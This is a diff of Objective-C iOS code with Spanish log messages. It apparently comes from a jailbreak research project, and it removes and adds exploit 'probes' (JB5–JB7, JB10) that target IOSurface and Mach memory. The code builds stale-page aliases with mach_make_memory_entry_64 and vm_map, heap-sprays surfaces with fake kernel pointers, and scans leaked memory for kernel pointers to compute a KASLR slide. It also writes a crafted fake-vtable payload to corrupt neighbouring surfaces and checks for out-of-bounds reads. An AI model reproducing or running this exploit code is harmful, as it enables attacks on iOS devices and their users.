-                    @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
-                    @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241),
-                    @"IOSurfaceAllocSize": @(0x4000),
-                    @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
-                };
-                sprays[i] = createSurf((__bridge CFDictionaryRef)sp);
-                if (!sprays[i]) break;
-                sprayCount++;
-
-                if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
-                void *sb = getBase(sprays[i]);
-                if (sb) {
-                    uint32_t sprayMark = 0xBB000000 | (uint32_t)i;
-                    memcpy(sb, &sprayMark, sizeof(sprayMark));
-                }
-                if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }
-
-                uint8_t *propBuf = (uint8_t *)calloc(1, 4096);
-                if (propBuf) {
-                    uint64_t fakeKernPtrs[8] = {
-                        0xfffffff007004000ULL + (uint64_t)i * 0x1000,
-                        0xfffffff007100000ULL + (uint64_t)i * 0x100,
-                        0xffffffe000000000ULL + (uint64_t)i * 0x10000,
-                        0xfffffff00710a000ULL,
-                        0xfffffff007200000ULL,
-                        0xffffffe0a0000000ULL + (uint64_t)(i * 0x4000),
-                        0xfffffff007004000ULL,
-                        0xDEADFACE00000000ULL | (uint64_t)i,
-                    };
-                    memcpy(propBuf, fakeKernPtrs, sizeof(fakeKernPtrs));
-                    for (int j = 64; j < 4096; j += 8) {
-                        uint64_t fill = 0xAAAA000000000000ULL | (uint64_t)((i << 16) | j);
-                        memcpy(propBuf + j, &fill, 8);
-                    }
-                    NSData *propData = [NSData dataWithBytes:propBuf length:4096];
-                    NSString *key = [NSString stringWithFormat:@"JB5_spray_%d", i];
-                    setValue(sprays[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)propData);
-
-                    setValue(sprays[i], (__bridge CFStringRef)[NSString stringWithFormat:@"JB5_num_%d", i],
-                             (__bridge CFTypeRef)@(0xDEADBEEF00000000ULL | (uint64_t)i));
-                    setValue(sprays[i], (__bridge CFStringRef)[NSString stringWithFormat:@"JB5_str_%d", i],
-                             CFSTR("KERNEL_SPRAY_MARKER"));
-                    free(propBuf);
-                }
-            }
-            log([NSString stringWithFormat:@"JB5: Spray: %d/50 superficies con propiedades", sprayCount]);
-        }
-
-        log(@"JB5: --- Paso 7: Escaneo del alias stale buscando punteros kernel ---");
-        if (!isr_stopped() && alias != 0) {
-            size_t scanSize = entrySize < 0x4000 ? (size_t)entrySize : 0x4000;
-            uint32_t interesting = 0;
-            uint32_t sprayPatterns = 0;
-
-            for (size_t off = 0; off + 8 <= scanSize && !isr_stopped(); off += 8) {
-                uint64_t val = 0;
-                memcpy(&val, (void*)(alias + off), sizeof(val));
-
-                if (val == 0) continue;
-
-                if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
-                    kernTextPtrs++;
-                    if (kernTextPtrs <= 20) {
-                        log([NSString stringWithFormat:@"JB5: *** KERNEL TEXT PTR @offset=0x%zx: 0x%016llx ***",
-                             off, (unsigned long long)val]);
-                    }
-                }
-                else if ((val & 0xFFFFFFE000000000ULL) == 0xFFFFFFE000000000ULL) {
-                    kernHeapPtrs++;
-                    if (kernHeapPtrs <= 20) {
-                        log([NSString stringWithFormat:@"JB5: *** KERNEL HEAP PTR @offset=0x%zx: 0x%016llx ***",
-                             off, (unsigned long long)val]);
-                    }
-                }
-                else if ((val & 0xFFFF000000000000ULL) == 0xAAAA000000000000ULL) {
-                    sprayPatterns++;
-                }
-                else if (val != 0 && val != 0xFFFFFFFFFFFFFFFFULL) {
-                    interesting++;
-                    if (interesting <= 10) {
-                        log([NSString stringWithFormat:@"JB5: Dato interesante @0x%zx: 0x%016llx",
-                             off, (unsigned long long)val]);
-                    }
-                }
-            }
-
-            log([NSString stringWithFormat:@"JB5: Escaneo %zu bytes: kernText=%u kernHeap=%u spray=%u otros=%u",
-                 scanSize, kernTextPtrs, kernHeapPtrs, sprayPatterns, interesting]);
-
-            if (kernTextPtrs > 0) {
-                uint64_t firstKPtr = 0;
-                for (size_t off = 0; off + 8 <= scanSize; off += 8) {
-                    uint64_t val = 0;
-                    memcpy(&val, (void*)(alias + off), sizeof(val));
-                    if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
-                        firstKPtr = val;
-                        break;
-                    }
-                }
-                uint64_t unslidBase = 0xfffffff007004000ULL;
-                uint64_t slide = firstKPtr - unslidBase;
-                log([NSString stringWithFormat:@"JB5: *** POSIBLE KASLR SLIDE: 0x%llx (basado en ptr 0x%llx) ***",
-                     (unsigned long long)slide, (unsigned long long)firstKPtr]);
-            }
-        }
-
-        log(@"JB5: --- Paso 8: Escritura cross-surface via alias ---");
-        if (!isr_stopped() && alias != 0) {
-            uint32_t poison = 0x41414141;
-            memcpy((void*)alias, &poison, sizeof(poison));
-
-            for (int i = 0; i < sprayCount && !isr_stopped(); i++) {
-                if (!sprays[i]) continue;
-                if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
-                void *sb = getBase(sprays[i]);
-                if (sb) {
-                    uint32_t v = 0;
-                    memcpy(&v, sb, sizeof(v));
-                    if (v == poison) {
-                        uint32_t sid = getID ? getID(sprays[i]) : 0;
-                        crossSurfaceWrites++;
-                        log([NSString stringWithFormat:
-                            @"JB5: *** ESCRITURA CROSS-SURFACE spray[%d] ID=%u ***", i, sid]);
-                    }
-                }
-                if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }
-            }
-            log([NSString stringWithFormat:@"JB5: Cross-surface writes confirmados: %u", crossSurfaceWrites]);
-        }
-
-        log(@"JB5: --- Paso 9: Task info para direcciones kernel ---");
-        if (!isr_stopped()) {
-            task_dyld_info_data_t di;
-            mach_msg_type_number_t dc = TASK_DYLD_INFO_COUNT;
-            if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&di, &dc) == KERN_SUCCESS) {
-                log([NSString stringWithFormat:@"JB5: DYLD all_image_info=0x%llx size=%llu",
-                     di.all_image_info_addr, di.all_image_info_size]);
-            }
-            struct task_vm_info vi;
-            mach_msg_type_number_t vc = TASK_VM_INFO_COUNT;
-            if (task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&vi, &vc) == KERN_SUCCESS) {
-                log([NSString stringWithFormat:@"JB5: VM vsize=0x%llx rsize=0x%llx pgsz=%d",
-                     vi.virtual_size, vi.resident_size, vi.page_size]);
-            }
-        }
-
-        for (int i = 0; i < sprayCount; i++) {
-            if (sprays[i]) CFRelease(sprays[i]);
-        }
-        free(sprays);
-        if (alias != 0) vm_deallocate(mach_task_self(), alias, (vm_size_t)entrySize);
-        if (entryPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), entryPort);
-
-        log(@"JB5: ========================================");
-        log([NSString stringWithFormat:@"JB5: Resultado: kernText=%u kernHeap=%u crossWrite=%u alias=%s",
-             kernTextPtrs, kernHeapPtrs, crossSurfaceWrites, aliasOK ? "OK" : "FAIL"]);
-        log(@"JB5: ========================================");
-
-        dlclose(h);
-        done(@{
-            @"kernTextPtrs": @(kernTextPtrs),
-            @"kernHeapPtrs": @(kernHeapPtrs),
-            @"crossSurfaceWrites": @(crossSurfaceWrites),
-            @"aliasOK": @(aliasOK),
-        });
-    });
-}
-
-#pragma mark - Probe JB6: Controlled Corruption via Stale Alias
-
-void iosurface_controlled_corruption(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
-    atomic_store(&g_isr_stop, false);
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        log(@"JB6: ========================================");
-        log(@"JB6: Controlled Corruption via Stale-Page Alias");
-        log(@"JB6: ========================================");
-
-        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
-        if (!h) { log(@"JB6: No se pudo abrir IOSurface.framework"); done(@{@"error": @"dlopen"}); return; }
-
-        typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
-        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
-        typedef uint32_t (*GetIDFn)(IOSurfaceRef);
-        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
-        typedef void* (*GetBaseFn)(IOSurfaceRef);
-        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
-        typedef size_t (*GetAllocSzFn)(IOSurfaceRef);
-        GetAllocSzFn getAllocSz = (GetAllocSzFn)dlsym(h, "IOSurfaceGetAllocSize");
-        typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
-        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");
-        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
-        SetValueFn setValue = (SetValueFn)dlsym(h, "IOSurfaceSetValue");
-        typedef CFDictionaryRef (*CopyAllFn)(IOSurfaceRef);
-        CopyAllFn copyAll = (CopyAllFn)dlsym(h, "IOSurfaceCopyAllValues");
-        typedef void (*RemoveValFn)(IOSurfaceRef, CFStringRef);
-        RemoveValFn removeVal = (RemoveValFn)dlsym(h, "IOSurfaceRemoveValue");
-
-        typedef kern_return_t (*MakeEntryFn)(vm_map_t, memory_object_size_t *,
-            memory_object_offset_t, vm_prot_t, mach_port_t *, mem_entry_name_port_t);
-        MakeEntryFn makeEntry = (MakeEntryFn)dlsym(RTLD_DEFAULT, "mach_make_memory_entry_64");
-
-        if (!createSurf || !getBase || !makeEntry || !setValue || !copyAll) {
-            log(@"JB6: Funciones criticas no disponibles");
-            dlclose(h); done(@{@"error": @"dlsym"}); return;
-        }
-        log(@"JB6: Todas las funciones cargadas OK");
-
-        uint32_t corruptedProps = 0;
-        uint32_t oobReads = 0;
-        int targetIdx = -1;
-        int sprayCount = 0;
-
-        mach_port_t entryPort = MACH_PORT_NULL;
-        memory_object_size_t entrySize = 0;
-        vm_address_t alias = 0;
-        IOSurfaceRef *sprays = (IOSurfaceRef *)calloc(30, sizeof(IOSurfaceRef));
-        if (!sprays) { log(@"JB6: calloc falló"); dlclose(h); done(@{@"error": @"calloc"}); return; }
-
-        NSDictionary *pgmProps = @{
-            @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
-            @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241),
-            @"IOSurfaceAllocSize": @(0x4000),
-            @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
-        };
-
-        log(@"JB6: --- Paso 1: Crear superficie victima A ---");
-        IOSurfaceRef victimA = createSurf((__bridge CFDictionaryRef)pgmProps);
-        if (!victimA) {
-            NSDictionary *fb = @{
-                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
-                @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241),
-                @"IOSurfaceAllocSize": @(0x4000),
-            };
-            victimA = createSurf((__bridge CFDictionaryRef)fb);
-        }
-        if (!victimA) {
-            log(@"JB6: Crear victima falló"); free(sprays); dlclose(h);
-            done(@{@"error": @"create_fail"}); return;
-        }
-
-        if (lockS) { uint32_t s = 0; lockS(victimA, 3, &s); }
-        void *baseA = getBase(victimA);
-        size_t allocA = getAllocSz ? getAllocSz(victimA) : 0;
-        uint32_t idA = getID ? getID(victimA) : 0;
-        log([NSString stringWithFormat:@"JB6: Victima A: ID=%u base=%p alloc=0x%zx", idA, baseA, allocA]);
-
-        if (!baseA || allocA == 0) {
-            if (unlockS) { uint32_t s = 0; unlockS(victimA, 3, &s); }
-            CFRelease(victimA); free(sprays); dlclose(h);
-            done(@{@"error": @"no_base"}); return;
-        }
-        uint32_t victimMarker = 0xDEAD6666;
-        memset(baseA, 0, allocA < 0x4000 ? allocA : 0x4000);
-        memcpy(baseA, &victimMarker, sizeof(victimMarker));
-        if (unlockS) { uint32_t s = 0; unlockS(victimA, 3, &s); }
-
-        log(@"JB6: --- Paso 2: mach_make_memory_entry_64 ---");
-        if (!isr_stopped()) {
-            entrySize = (memory_object_size_t)allocA;
-            kern_return_t mkr = makeEntry(mach_task_self(), &entrySize,
-                (memory_object_offset_t)(uintptr_t)baseA,
-                VM_PROT_READ | VM_PROT_WRITE, &entryPort, MACH_PORT_NULL);
-            log([NSString stringWithFormat:@"JB6: memory_entry kr=%d port=%u", mkr, entryPort]);
-            if (mkr != KERN_SUCCESS) {
-                CFRelease(victimA); free(sprays); dlclose(h);
-                done(@{@"error": @"entry_fail"}); return;
-            }
-        }
-
-        log(@"JB6: --- Paso 3: vm_map alias ---");
-        if (!isr_stopped()) {
-            kern_return_t vmkr = vm_map(mach_task_self(), &alias, (vm_size_t)entrySize,
-                0, VM_FLAGS_ANYWHERE, entryPort, 0, FALSE,
-                VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
-                VM_INHERIT_NONE);
-            log([NSString stringWithFormat:@"JB6: vm_map kr=%d alias=%p", vmkr, (void*)alias]);
-            if (vmkr != KERN_SUCCESS) {
-                mach_port_deallocate(mach_task_self(), entryPort);
-                CFRelease(victimA); free(sprays); dlclose(h);
-                done(@{@"error": @"vm_map_fail"}); return;
-            }
-        }
-
-        log(@"JB6: --- Paso 4: CFRelease victima A ---");
-        CFRelease(victimA);
-        victimA = NULL;
-
-        log(@"JB6: --- Paso 5: Spray 30 PurpleGfxMem con marcadores ---");
-        if (!isr_stopped()) {
-            for (int i = 0; i < 30 && !isr_stopped(); i++) {
-                sprays[i] = createSurf((__bridge CFDictionaryRef)pgmProps);
-                if (!sprays[i]) break;
-                sprayCount++;
-
-                if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
-                void *sb = getBase(sprays[i]);
-                if (sb) {
-                    uint32_t sprayMark = 0xBB000000 | (uint32_t)i;
-                    memcpy(sb, &sprayMark, sizeof(sprayMark));
-                    for (int j = 4; j < 256; j += 4) {
-                        uint32_t fill = 0xCC000000 | (uint32_t)((i << 8) | (j / 4));
-                        memcpy((uint8_t*)sb + j, &fill, sizeof(fill));
-                    }
-                }
-                if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }
-
-                uint8_t *propBuf = (uint8_t *)calloc(1, 2048);
-                if (propBuf) {
-                    uint64_t tag = 0xFACE000000000000ULL | (uint64_t)i;
-                    memcpy(propBuf, &tag, 8);
-                    for (int j = 8; j < 2048; j += 8) {
-                        uint64_t v = 0xDD00000000000000ULL | (uint64_t)((i << 16) | (j / 8));
-                        memcpy(propBuf + j, &v, 8);
-                    }
-                    NSData *d = [NSData dataWithBytes:propBuf length:2048];
-                    NSString *key = [NSString stringWithFormat:@"JB6_data_%d", i];
-                    setValue(sprays[i], (__bridge CFStringRef)key, (__bridge CFTypeRef)d);
-                    free(propBuf);
-                }
-            }
-            log([NSString stringWithFormat:@"JB6: Spray: %d/30 superficies", sprayCount]);
-        }
-
-        log(@"JB6: --- Paso 6: Identificar superficie reclamada ---");
-        if (!isr_stopped() && alias != 0) {
-            uint32_t aliasVal = 0;
-            memcpy(&aliasVal, (void*)alias, sizeof(aliasVal));
-            log([NSString stringWithFormat:@"JB6: Alias lee: 0x%08X", aliasVal]);
-
-            if ((aliasVal & 0xFF000000) == 0xBB000000) {
-                targetIdx = (int)(aliasVal & 0x00FFFFFF);
-                log([NSString stringWithFormat:@"JB6: *** RECLAMADO POR spray[%d] ***", targetIdx]);
-            } else if (aliasVal == victimMarker) {
-                log(@"JB6: Alias aun tiene datos viejos — no reclamado");
-            } else {
-                log([NSString stringWithFormat:@"JB6: Contenido desconocido: 0x%08X", aliasVal]);
-                for (int i = 0; i < sprayCount; i++) {
-                    if (!sprays[i]) continue;
-                    if (lockS) { uint32_t s = 0; lockS(sprays[i], 3, &s); }
-                    void *sb = getBase(sprays[i]);
-                    if (sb) {
-                        uint32_t v = 0;
-                        memcpy(&v, sb, sizeof(v));
-                        if ((uintptr_t)sb == (uintptr_t)baseA) {
-                            targetIdx = i;
-                            log([NSString stringWithFormat:@"JB6: Target por direccion: spray[%d]", i]);
-                        }
-                    }
-                    if (unlockS) { uint32_t s = 0; unlockS(sprays[i], 3, &s); }
-                    if (targetIdx >= 0) break;
-                }
-            }
-        }
-
-        log(@"JB6: --- Paso 7: Escribir patron crafteado via alias ---");
-        if (!isr_stopped() && alias != 0) {
-            uint8_t craftedPayload[256];
-            memset(craftedPayload, 0, sizeof(craftedPayload));
-
-            uint64_t fakeTypeMarker = 0x4346446174610000ULL;
-            uint64_t fakeLength = 0x0000000000100000ULL;
-            uint64_t fakePointer = 0xfffffff007004000ULL;
-            uint64_t fakeVtable = 0xfffffff00710a000ULL;
-
-            memcpy(craftedPayload + 0, &fakeTypeMarker, 8);
-            memcpy(craftedPayload + 8, &fakeLength, 8);
-            memcpy(craftedPayload + 16, &fakePointer, 8);
-            memcpy(craftedPayload + 24, &fakeVtable, 8);
-
-            for (int j = 32; j < 256; j += 8) {
-                uint64_t pat = 0x4141414100000000ULL | (uint64_t)(j / 8);
-                memcpy(craftedPayload + j, &pat, 8);
-            }
-
-            memcpy((void*)alias, craftedPayload, sizeof(craftedPayload));
-            log(@"JB6: Patron crafteado escrito (256 bytes): fakeType+fakeLen+fakePtr+fakeVtable");
-
-            if (targetIdx >= 0 && targetIdx < sprayCount && sprays[targetIdx]) {
-                if (lockS) { uint32_t s = 0; lockS(sprays[targetIdx], 3, &s); }
-                void *tb = getBase(sprays[targetIdx]);
-                if (tb) {
-                    uint64_t readBack[4] = {0};
-                    memcpy(readBack, tb, 32);
-                    log([NSString stringWithFormat:@"JB6: Target base despues de write: 0x%016llx 0x%016llx 0x%016llx 0x%016llx",
-                         (unsigned long long)readBack[0], (unsigned long long)readBack[1],
-                         (unsigned long long)readBack[2], (unsigned long long)readBack[3]]);
-                    if (readBack[0] == fakeTypeMarker) {
-                        log(@"JB6: *** ESCRITURA CROSS-SURFACE CONFIRMADA — payload visible en target ***");
-                        corruptedProps++;
-                    }
-                }
-                if (unlockS) { uint32_t s = 0; unlockS(sprays[targetIdx], 3, &s); }
-            }
-        }
-
-        log(@"JB6: --- Paso 8: CopyAllValues en superficie target ---");
-        if (!isr_stopped() && targetIdx >= 0 && targetIdx < sprayCount && sprays[targetIdx]) {
-            CFDictionaryRef allVals = copyAll(sprays[targetIdx]);
-            if (allVals) {
-                CFIndex cnt = CFDictionaryGetCount(allVals);
-                log([NSString stringWithFormat:@"JB6: Target CopyAllValues: %ld keys", (long)cnt]);
-
-                if (cnt > 0 && cnt < 200) {
-                    const void **keys = (const void **)malloc(sizeof(void*) * (size_t)cnt);
-                    const void **vals = (const void **)malloc(sizeof(void*) * (size_t)cnt);
-                    if (keys && vals) {
-                        CFDictionaryGetKeysAndValues(allVals, keys, vals);
-                        for (CFIndex i = 0; i < cnt && i < 30; i++) {
-                            NSString *k = (__bridge NSString *)keys[i];
-                            CFTypeID tid = CFGetTypeID(vals[i]);
-                            if (tid == CFDataGetTypeID()) {
-                                CFDataRef d = (CFDataRef)vals[i];
-                                CFIndex dlen = CFDataGetLength(d);
-                                log([NSString stringWithFormat:@"JB6: [%ld] %@ = Data(%ld bytes)", (long)i, k, (long)dlen]);
-                                if (dlen > 2048) {
-                                    oobReads++;
-                                    log([NSString stringWithFormat:@"JB6: *** OOB DETECTADO — dato mas grande que lo almacenado (2048 -> %ld) ***", (long)dlen]);
-                                }
-                                if (dlen >= 8) {
-                                    const uint8_t *bytes = CFDataGetBytePtr(d);
-                                    uint64_t first8 = 0;
-                                    memcpy(&first8, bytes, 8);
-                                    log([NSString stringWithFormat:@"JB6: Primeros 8 bytes: 0x%016llx", (unsigned long long)first8]);
-                                }
-                            } else if (tid == CFNumberGetTypeID()) {
-                                int64_t nv = 0;
-                                CFNumberGetValue((CFNumberRef)vals[i], kCFNumberSInt64Type, &nv);
-                                log([NSString stringWithFormat:@"JB6: [%ld] %@ = Num(0x%llx)", (long)i, k, (uint64_t)nv]);
-                            } else if (tid == CFStringGetTypeID()) {
-                                log([NSString stringWithFormat:@"JB6: [%ld] %@ = Str(%@)", (long)i, k, (__bridge NSString*)vals[i]]);
-                            } else {
-                                log([NSString stringWithFormat:@"JB6: [%ld] %@ = TypeID(%lu)", (long)i, k, (unsigned long)tid]);
-                            }
-                        }
-                    }
-                    if (keys) free(keys);
-                    if (vals) free(vals);
-                }
-                CFRelease(allVals);
-            } else {
-                log(@"JB6: CopyAllValues devolvio NULL en target — posible corrupcion");
-                corruptedProps++;
-            }
-        }
-
-        log(@"JB6: --- Paso 9: Escaneo extendido del alias (buscar metadata kernel) ---");
-        if (!isr_stopped() && alias != 0) {
-            size_t scanSz = entrySize < 0x4000 ? (size_t)entrySize : 0x4000;
-            uint32_t kptrs = 0;
-            for (size_t off = 0; off + 8 <= scanSz; off += 8) {
-                uint64_t val = 0;
-                memcpy(&val, (void*)(alias + off), sizeof(val));
-                if ((val >> 36) == 0xFFFFFFF00ULL || (val >> 33) == 0x7FFFFFF0ULL) {
-                    kptrs++;
-                    if (kptrs <= 10) {
-                        log([NSString stringWithFormat:@"JB6: KernPtr @0x%zx = 0x%016llx", off, (unsigned long long)val]);
-                    }
-                }
-            }
-            log([NSString stringWithFormat:@"JB6: Escaneo extendido: %u punteros kernel en %zu bytes", kptrs, scanSz]);
-        }
-
-        log(@"JB6: --- Paso 10: CopyAllValues en superficies adyacentes ---");
-        if (!isr_stopped()) {
-            for (int i = 0; i < sprayCount && i < 5 && !isr_stopped(); i++) {
-                if (!sprays[i] || i == targetIdx) continue;
-                CFDictionaryRef av = copyAll(sprays[i]);
-                if (av) {
-                    CFIndex cnt = CFDictionaryGetCount(av);
-                    uint32_t sid = getID ? getID(sprays[i]) : 0;
-                    log([NSString stringWithFormat:@"JB6: spray[%d] ID=%u keys=%ld", i, sid, (long)cnt]);
-
-                    if (cnt > 0 && cnt < 100) {
-                        const void **keys2 = (const void **)malloc(sizeof(void*) * (size_t)cnt);
-                        const void **vals2 = (const void **)malloc(sizeof(void*) * (size_t)cnt);
-                        if (keys2 && vals2) {
-                            CFDictionaryGetKeysAndValues(av, keys2, vals2);
-                            for (CFIndex j = 0; j < cnt; j++) {
-                                if (CFGetTypeID(vals2[j]) == CFDataGetTypeID()) {
-                                    CFIndex dlen = CFDataGetLength((CFDataRef)vals2[j]);
-                                    if (dlen > 2048) {
-                                        oobReads++;
-                                        log([NSString stringWithFormat:@"JB6: *** OOB en spray[%d]: %ld bytes (esperado <=2048) ***",
-                                             i, (long)dlen]);
-                                    }
-                                }
-                            }
-                        }
-                        if (keys2) free(keys2);
-                        if (vals2) free(vals2);
-                    }
-                    CFRelease(av);
-                } else {
-                    log([NSString stringWithFormat:@"JB6: spray[%d] CopyAllValues=NULL — posible corrupcion", i]);
-                    corruptedProps++;
-                }
-            }
-        }
-
-        log(@"JB6: --- Paso 11: Task info harvest ---");
-        if (!isr_stopped()) {
-            task_dyld_info_data_t di;
-            mach_msg_type_number_t dc = TASK_DYLD_INFO_COUNT;
-            if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&di, &dc) == KERN_SUCCESS) {
-                log([NSString stringWithFormat:@"JB6: DYLD info=0x%llx size=%llu", di.all_image_info_addr, di.all_image_info_size]);
-            }
-            struct task_vm_info vi;
-            mach_msg_type_number_t vc = TASK_VM_INFO_COUNT;
-            if (task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&vi, &vc) == KERN_SUCCESS) {
-                log([NSString stringWithFormat:@"JB6: VM vsize=0x%llx rsize=0x%llx min_addr=0x%llx max_addr=0x%llx",
-                     vi.virtual_size, vi.resident_size, vi.min_address, vi.max_address]);
-            }
-        }
-
-        for (int i = 0; i < sprayCount; i++) {
-            if (sprays[i]) CFRelease(sprays[i]);
-        }
-        free(sprays);
-        if (alias != 0) vm_deallocate(mach_task_self(), alias, (vm_size_t)entrySize);
-        if (entryPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), entryPort);
-
-        log(@"JB6: ========================================");
-        log([NSString stringWithFormat:@"JB6: Resultado: corrupted=%u oob=%u target=%d",
-             corruptedProps, oobReads, targetIdx]);
-        log(@"JB6: ========================================");
-
-        dlclose(h);
-        done(@{
-            @"corruptedProps": @(corruptedProps),
-            @"oobReads": @(oobReads),
-            @"targetIdx": @(targetIdx),
-        });
-    });
-}
-
-#pragma mark - Probe JB7: Mach OOL Message Spray into Stale Alias
-
-void iosurface_ool_spray_alias(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
-    atomic_store(&g_isr_stop, false);
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        log(@"JB7: ========================================");
-        log(@"JB7: Mach OOL Message Spray into Stale Alias");
-        log(@"JB7: ========================================");
-
-        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        log(@"JB10: ========================================");
+        log(@"JB10: Normal Surface Stale Alias — SIN PurpleGfxMem");
+        log(@"JB10: Páginas vm_allocate pueden compartir con kernel");
+        log(@"JB10: ========================================");
+
+        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
+                         RTLD_LAZY | RTLD_LOCAL);
         if (!h) { done(@{@"error": @"dlopen"}); return; }
 
         typedef IOSurfaceRef (*CreateFn)(CFDictionaryRef);
-        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
-        typedef void* (*GetBaseFn)(IOSurfaceRef);
-        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
+        typedef uint32_t (*GetIDFn)(IOSurfaceRef);
+        typedef void *(*GetBaseFn)(IOSurfaceRef);
         typedef size_t (*GetAllocSzFn)(IOSurfaceRef);
-        GetAllocSzFn getAllocSz = (GetAllocSzFn)dlsym(h, "IOSurfaceGetAllocSize");
         typedef kern_return_t (*LockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
-        typedef kern_return_t (*UnlockFn)(IOSurfaceRef, uint32_t, uint32_t *);
-        UnlockFn unlockS = (UnlockFn)dlsym(h, "IOSurfaceUnlock");
         typedef kern_return_t (*MakeEntryFn)(vm_map_t, memory_object_size_t *,
             memory_object_offset_t, vm_prot_t, mach_port_t *, mem_entry_name_port_t);
+
+        CreateFn createSurf = (CreateFn)dlsym(h, "IOSurfaceCreate");
+        GetIDFn getID = (GetIDFn)dlsym(h, "IOSurfaceGetID");
+        GetBaseFn getBase = (GetBaseFn)dlsym(h, "IOSurfaceGetBaseAddress");
+        GetAllocSzFn getAllocSz = (GetAllocSzFn)dlsym(h, "IOSurfaceGetAllocSize");
+        LockFn lockS = (LockFn)dlsym(h, "IOSurfaceLock");
+        LockFn unlockS = (LockFn)dlsym(h, "IOSurfaceUnlock");
         MakeEntryFn makeEntry = (MakeEntryFn)dlsym(RTLD_DEFAULT, "mach_make_memory_entry_64");
 
         if (!createSurf || !getBase || !makeEntry) {
-            log(@"JB7: Funciones no disponibles");
-            dlclose(h); done(@{@"error": @"dlsym"}); return;
+            dlclose(h);
+            done(@{@"error": @"dlsym"});
+            return;
         }
 
         uint32_t kernTextPtrs = 0;
         uint32_t kernHeapPtrs = 0;
         uint32_t oolHits = 0;
+        uint32_t vmHits = 0;
+        uint32_t pipeHits = 0;
         uint64_t bestPtr = 0;
-
-        log(@"JB7: --- Paso 1: Crear superficie + alias stale ---");
-        NSDictionary *props = @{
-            @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
-            @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241),
-            @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
-        };
-        IOSurfaceRef surf = createSurf((__bridge CFDictionaryRef)props);
-        if (!surf) {
-            NSDictionary *fb = @{ @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
-                @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @(0x42475241) };
-            surf = createSurf((__bridge CFDictionaryRef)fb);
-        }
-        if (!surf) { dlclose(h); done(@{@"error": @"create"}); return; }
-
-        size_t allocSz = getAllocSz ? getAllocSz(surf) : 0;
-        if (lockS) { uint32_t s = 0; lockS(surf, 3, &s); }
-        void *base = getBase(surf);
-        if (!base || allocSz == 0) {
-            if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
-            CFRelease(surf); dlclose(h); done(@{@"error": @"no_base"}); return;
-        }
-
-        uint32_t marker = 0xDEAD7777;
-        memcpy(base, &marker, 4);
-        if (unlockS) { uint32_t s = 0; unlockS(surf, 3, &s); }
-
-        mach_port_t entryPort = MACH_PORT_NULL;
-        memory_object_size_t entrySize = (memory_object_size_t)allocSz;
-        kern_return_t mkr = makeEntry(mach_task_self(), &entrySize,
-            (memory_object_offset_t)(uintptr_t)base,
-            VM_PROT_READ | VM_PROT_WRITE, &entryPort, MACH_PORT_NULL);
-        if (mkr != KERN_SUCCESS) {
-            CFRelease(surf); dlclose(h); done(@{@"error": @"entry"}); return;
-        }
-
         vm_address_t alias = 0;
-        vm_map(mach_task_self(), &alias, (vm_size_t)entrySize, 0, VM_FLAGS_ANYWHERE,
-            entryPort, 0, FALSE, VM_PROT_READ | VM_PROT_WRITE,
-            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+        mach_port_t entryPort = MACH_PORT_NULL;
+        memory_object_size_t entrySize = 0;
+        int (*pipeFds)[2] = NULL;
+        int pipeCount = 0;
 
-        uint32_t check = 0;
